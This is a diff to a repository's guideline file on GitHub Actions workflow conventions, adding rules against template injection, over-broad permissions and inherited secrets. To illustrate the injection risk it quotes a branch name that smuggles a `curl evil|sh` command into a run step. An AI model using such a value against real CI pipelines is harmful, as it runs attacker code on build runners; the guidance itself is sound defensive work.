@@ -11,7 +11,10 @@ paths:
 - Inline shell in workflow YAML files should be kept to a minimum - extract into a `.sh` file under `.github/scripts/<workflow-name>/` once the code has any branching (`if/else`), loops, or meaningful logic. A few sequential commands with no branching are fine inline.
 - Script names must be descriptive and reflect what the script does (e.g. `create-pr.sh`, `label-pr.sh`)
 - Call scripts with an explicit interpreter: `run: bash .github/scripts/<workflow-name>/<descriptive-name>.sh`
-- Pass GitHub context values as positional arguments (e.g. `"${{ github.ref_name }}"`) - do not rely on environment variables being implicitly available inside scripts
+- Pass GitHub context values to a script as positional arguments - do not rely on environment variables being implicitly available inside scripts
+- **Never paste a value somebody else can set into a `run:` block with `${{ }}`.** GitHub pastes it into the script before the shell sees it, so a branch named `x";curl evil|sh;"` runs as shell. That covers branch and ref names, anything under `github.event`, and a step output built from a pull request's contents. Read it from the environment and pass that on: `run: bash .github/scripts/auto-pr/create-pr.sh "$GITHUB_REF_NAME"`. The runner already sets `GITHUB_REF_NAME`, `GITHUB_REF`, `GITHUB_REPOSITORY`, `GITHUB_RUN_ID`, `GITHUB_SHA` and `GITHUB_ACTOR`; anything else, such as `github.event.pull_request.head.sha`, goes in the step's `env:` first. zizmor's `template-injection` audit, in the pre-commit hook and in CI, refuses most of these; it rates a step output only informational, so that case is yours to catch
+- **Grant write permissions on the job that uses them**, never at the top of the workflow, which hands them to every job. The top-level `permissions:` block stays read-only; zizmor's `excessive-permissions` audit enforces it
+- **Pass a reusable workflow its secrets by name**, never with `secrets: inherit`, so it receives only what it declares under `workflow_call.secrets`
 
 ## Shell script structure
 
